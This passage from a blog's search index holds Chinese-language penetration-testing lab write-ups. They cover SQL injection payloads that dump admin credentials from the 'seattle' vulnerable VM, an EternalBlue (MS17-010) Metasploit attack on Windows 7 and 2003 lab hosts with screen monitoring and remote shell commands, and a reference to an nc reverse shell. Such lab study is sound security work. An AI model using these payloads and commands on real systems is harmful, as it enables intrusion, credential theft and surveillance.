class="headerlink" title="4.打靶总结："></a>4.打靶总结：</h3><p>①：常规的信息收集，通过目录扫描获取后续的信息</p><p>②：存在注入点使该网站存在危险，同时phpinfo页面暴露出网站的绝对路径导致–os-shell的成功建立（关掉phpinfo页面后会降低大量风险）</p><p>③：通过创建管道命令来建立nc的远程连接，间接避开了nc -e不能直接使用</p><p>④：提权方法多样化，说明存在多个漏洞</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>seattle</title>
    <link href="/2023/09/19/seattle/"/>
    <url>/2023/09/19/seattle/</url>
    
    <content type="html"><![CDATA[<h2 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h2><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">攻击机： kali <span class="hljs-number">192.168.190.130</span>  靶机：seattle<br></code></pre></td></tr></table></figure><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><p>在kali中使用nmap攻击扫描同一网段的存活主机：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.190.0</span>/<span class="hljs-number">24</span><br>//得到了目标靶机为<span class="hljs-number">192.168.190.179</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/19/seattle/image-20230919081849951.png" alt="image-20230919081849951"></p><p>使用nmap扫描目标主机开放的端口有哪些：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">nmap -A -p- <span class="hljs-number">192.168</span>.<span class="hljs-number">190.179</span><br><span class="hljs-regexp">//</span>只扫描了目标靶机开放了<span class="hljs-number">80</span>端口，在此端口上运行着HTTP服务，web服务器被识别为Apache httpd的<span class="hljs-number">2.4</span>.<span class="hljs-number">16</span>版本；运行在Fedora上<br>还检测到了OpenSSL的<span class="hljs-number">1.0</span>.<span class="hljs-number">2</span>d-fips版本，以及PHP的<span class="hljs-number">5.6</span>.<span class="hljs-number">14</span>版本，linux系统，内核有多个发型版本<br></code></pre></td></tr></table></figure><p><img src="/2023/09/19/seattle/image-20230919082601869.png" alt="image-20230919082601869"></p><p>可以先看看80端口的服务，访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">点击图中的两处可一获得一个pdf文档，文档中会给你许多的提示<br></code></pre></td></tr></table></figure><p><img src="/2023/09/19/seattle/image-20230919084745998.png" alt="image-20230919084745998"></p><p><img src="/2023/09/19/seattle/image-20230921104450907.png" alt="image-20230921104450907"></p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><h3 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h3><p>点击Vinyl，可能存在注入点：</p><p><img src="/2023/09/19/seattle/image-20230921104702924.png" alt="image-20230921104702924"></p><p>输入万能公式：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> <span class="hljs-number">1</span> = <span class="hljs-number">2</span>  //存在sql注入漏洞，经过判断是数字型的注入漏洞<br></code></pre></td></tr></table></figure><p><img src="/2023/09/19/seattle/image-20230921104739495.png" alt="image-20230921104739495"></p><p>判断回显字段数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">order</span> by <span class="hljs-number">5</span>  -- +   //判断出回显字段数是<span class="hljs-number">5</span> <br></code></pre></td></tr></table></figure><p><img src="/2023/09/19/seattle/image-20230921104938101.png" alt="image-20230921104938101"></p><p>开始爆数据：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- +</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- +   //得到数据库名 seattle</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,version(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- + //获得数据库的版本  10.0.23-MariaDB</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- + //获得数据库的用户  root@localhost</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,@@basedir,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- +  //获取数据库的安装目录 /usr</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,@@plugin_dir,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- + //查看plugin的安装路径/usr/lib64/mysql/plugin/</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,@@version_compile_os,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- +//查询当前的操作系统：Linux</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,@@version_compile_machine,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- + //查询操作系统是多少位x86_64</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>() <span class="hljs-comment">-- +  // 得到表名 tblBlogs,tblMembers,tblProducts</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;tblMembers&#x27;</span> <span class="hljs-comment">-- +    //得到字段名  id,username,password,session,name,blog,admin</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,username,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> seattle.tblMembers<span class="hljs-comment">-- +  //得到账户名admin@seattlesounds.net</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-keyword">password</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-keyword">session</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-type">name</span>,<span class="hljs-string">&#x27;|&#x27;</span>,blog,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-keyword">admin</span>),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> seattle.tblMembers<span class="hljs-comment">-- + //爆出表中的所有数据admin@seattlesounds.net|Assasin1|4cff8a69eb2824aebd478b9745ba6955|Admin|1|1</span><br><br></code></pre></td></tr></table></figure><p>得到一个登录名和密码：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">账户：<span class="hljs-literal">admin</span>@seattlesounds.net   密码：Assasin1 名字：<span class="hljs-literal">admin</span><br></code></pre></td></tr></table></figure><p>点击mycount进入到登录页面：</p><p><img src="/2023/09/19/seattle/image-20230921144547869.png" alt="image-20230921144547869"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>永恒之蓝</title>
    <link href="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    <url>/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="永恒之蓝："><a href="#永恒之蓝：" class="headerlink" title="永恒之蓝："></a>永恒之蓝：</h1><h2 id="window7："><a href="#window7：" class="headerlink" title="window7："></a>window7：</h2><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理:"></a>漏洞原理:</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">永恒之蓝是在Windows的SMB服务处理SMB <span class="hljs-built_in">v1</span>请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放<span class="hljs-number">445</span>文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序<br></code></pre></td></tr></table></figure><h2 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h2><h3 id="攻击机："><a href="#攻击机：" class="headerlink" title="攻击机："></a>攻击机：</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kali</span>： <span class="hljs-number">192.168.190.130</span><br></code></pre></td></tr></table></figure><h3 id="目标靶机："><a href="#目标靶机：" class="headerlink" title="目标靶机："></a>目标靶机：</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">window</span> <span class="hljs-number">7</span> <span class="hljs-number">32</span>位：<span class="hljs-number">192.168.190.170</span>  //<span class="hljs-number">32</span>位和<span class="hljs-number">64</span>位的靶机所使用的一些参数不一样 需要目标的防火墙和杀毒软件关闭<br></code></pre></td></tr></table></figure><h3 id="使用工具："><a href="#使用工具：" class="headerlink" title="使用工具："></a>使用工具：</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br></code></pre></td></tr></table></figure><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><h3 id="使用arp-sweep扫描存活主机："><a href="#使用arp-sweep扫描存活主机：" class="headerlink" title="使用arp_sweep扫描存活主机："></a>使用arp_sweep扫描存活主机：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">开启msf，使用msf的辅助模块auxiliary的arp_sweep<br>use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/arp_sweep<br></code></pre></td></tr></table></figure><p>进行存活主机的扫描：</p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916091642313.png" alt="image-20230916091642313"></p><p>通过show options 命令来查看该模块所需要的参数：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">show</span> options  //发现在RHOSTS需要使用<span class="hljs-literal">yes</span>，此处需要我们设置网段<span class="hljs-number">192.168.190.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916091731803.png" alt="image-20230916091731803"></p><p>通过set rhosts来设置需要扫描的网段：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> rhosts <span class="hljs-number">192.168</span><span class="hljs-number">.190</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>     //大小写不区分，设置完后，有需要的话可以通过<span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span> 来查看参数是否设置成功<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916092117973.png" alt="image-20230916092117973"></p><p>接下来通过run命令来运行该模块：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">run     <span class="hljs-comment">//exploit命令也可以</span><br>可以看到扫描到了<span class="hljs-number">130</span>和<span class="hljs-number">174</span>，两个ip，其中<span class="hljs-number">130</span>是kali的，<span class="hljs-number">174</span>是目标靶机的<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916110944440.png" alt="image-20230916110944440"></p><h3 id="使用portscan扫描开放的端口："><a href="#使用portscan扫描开放的端口：" class="headerlink" title="使用portscan扫描开放的端口："></a>使用portscan扫描开放的端口：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>portscan<span class="hljs-regexp">/tcp  /</span><span class="hljs-regexp">/同时使用show options来查看该模块需要的参数（rhosts）ip</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916093447957.png" alt="image-20230916093447957"></p><p>通过set rhosts来设置目标靶机ip：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111055385.png" alt="image-20230916111055385"></p><p>通过run命令来执行该模块扫描端口：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">run   <span class="hljs-regexp">//</span>扫到目标靶机开放的端口为：<span class="hljs-number">135</span> <span class="hljs-number">139</span> <span class="hljs-number">445</span> <span class="hljs-number">5357</span> <br><span class="hljs-regexp">//</span>特别是这个<span class="hljs-number">445</span>端口，是利用永恒之蓝的重点<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111149189.png" alt="image-20230916111149189"></p><p>发现目标靶机开放了445端口，为接下来的攻击提供了基础，在msf中search永恒之蓝的模块：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">search ms17_010  <span class="hljs-regexp">//m</span>s17_010为永恒之蓝的漏洞名称<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916105533668.png" alt="image-20230916105533668"></p><h3 id="通过利用smb-ms17-010模块："><a href="#通过利用smb-ms17-010模块：" class="headerlink" title="通过利用smb_ms17_010模块："></a>通过利用smb_ms17_010模块：</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">该模块是用来探查目标靶机是否存在永恒之蓝该漏洞<br>将rhosts 处改为目标靶机ip<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111255766.png" alt="image-20230916111255766"></p><p>接下来直接run：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">run   <span class="hljs-comment">//通过扫描结果得知目标靶机易受到ms17_010攻击</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111437710.png" alt="image-20230916111437710"></p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><h3 id="使用ms17的漏洞模块攻击靶机："><a href="#使用ms17的漏洞模块攻击靶机：" class="headerlink" title="使用ms17的漏洞模块攻击靶机："></a>使用ms17的漏洞模块攻击靶机：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">由于我们的目标靶机为<span class="hljs-number">32</span>位的（和<span class="hljs-number">64</span>位的攻击方式不太一样），所以我们应该提前下载一些配置，参考大佬博客：<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_41617034/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">91051614</span><br></code></pre></td></tr></table></figure><p>利用exp的攻击模块：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>smb/ms17_010_eternalblue_32<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112113727.png" alt="image-20230916112113727"></p><p>通过show payloads命令查看payload模块：</p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112314337.png" alt="image-20230916112314337"></p><p>set payload命令设置：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">同时在模块参数中，PROCESSINJECT和RHOSTS都需要设置，<span class="hljs-number">32</span>位的PROCESSINJECT的参数设置为：explorer.exe<br>RHOSTS设置目标靶机：<span class="hljs-number">192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112438945.png" alt="image-20230916112438945"></p><p>设置PROCESSINJECT的参数和RHOSTS的参数：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> processinject <span class="hljs-comment">explorer.exe</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112708775.png" alt="image-20230916112708775"></p><p>接下来尝试run：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">可以看到攻击成功，拿下了wi<span class="hljs-symbol">ndows7</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916113157528.png" alt="image-20230916113157528"></p><h3 id="入侵后可以干的一些事情："><a href="#入侵后可以干的一些事情：" class="headerlink" title="入侵后可以干的一些事情："></a>入侵后可以干的一些事情：</h3><p>尝试一些命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">screenshot 屏幕截图  <span class="hljs-regexp">//</span>将win7的屏幕截图并且保持到kali的用户目录下<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916113301165.png" alt="image-20230916113301165"></p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916113341578.png" alt="image-20230916113341578"></p><p>成功入侵靶机电脑，你就可以干一些你想干点事情：</p><p>such as ：</p><p>监控对方电脑屏幕：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> vnc -i <br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916114409908.png" alt="image-20230916114409908"></p><p>回车切换到会话端：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>生成的这个屏幕监控会放一边<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916114705026.png" alt="image-20230916114705026"></p><p>可以通过keyboard_send命令发送你想发送的信息：</p><p>先打开记事本，然后通过keyboard_send来发送想要发送的信息：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">execute -f notepad<br>keyboard_send nihao!!!<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916115004580.png" alt="image-20230916115004580"></p><p>切换到测试的wind7靶机：</p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916115124362.png" alt="image-20230916115124362"></p><p>监控页面：</p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916115137069.png" alt="image-20230916115137069"></p><p>想要干更多的事情可以参考另一个大佬的博客：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/yuanyuzhou/</span>p/<span class="hljs-number">16118409</span>.html<br></code></pre></td></tr></table></figure><p>以上的操作均是在合法的环境中进行！</p><h2 id="续接：windows-2003："><a href="#续接：windows-2003：" class="headerlink" title="续接：windows 2003："></a>续接：windows 2003：</h2><h3 id="测试环境：-1"><a href="#测试环境：-1" class="headerlink" title="测试环境："></a>测试环境：</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows</span> <span class="hljs-number">2003</span> <span class="hljs-number">32</span>位<br></code></pre></td></tr></table></figure><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><p>arp_sweep扫描目标存活主机;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/arp_sweep<br>run<br><span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.167</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916122820816.png" alt="image-20230916122820816"></p><p>portscan&#x2F;tcp模块扫描目标靶机开放的端口：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp<br>set rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">190.167</span><br>run<br><span class="hljs-regexp">//</span>可以看到该靶机开放了<span class="hljs-number">445</span>端口<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916123020511.png" alt="image-20230916123020511"></p><p>利用检查是否存在利用漏洞的模块来检测目标靶机：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_ms17_010<br>set rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">190.167</span><br>show options<br><span class="hljs-regexp">//</span>可以看到win2003存在该漏洞<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916123158801.png" alt="image-20230916123158801"></p><h2 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">尝试使用针对2007的漏洞脚本模块，发现不行<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124005735.png" alt="image-20230916124005735"></p><p>通过查询，发现，另一个漏洞模块可以利用：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">exploit<span class="hljs-regexp">/windows/</span>smb/ms17_010_psexec<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124113496.png" alt="image-20230916124113496"></p><p>该模块设置好目标靶机：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">即可攻击 /<span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124143136.png" alt="image-20230916124143136"></p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124203548.png" alt="image-20230916124203548"></p><p>可以通过shell命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">shell  <span class="hljs-regexp">//</span>进入到目标靶机的终端<br>chcp <span class="hljs-number">56001</span> 改变当前会话的编码格式，减少乱码的出现<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124302179.png" alt="image-20230916124302179"></p><p>大部分功能可以照常使用</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
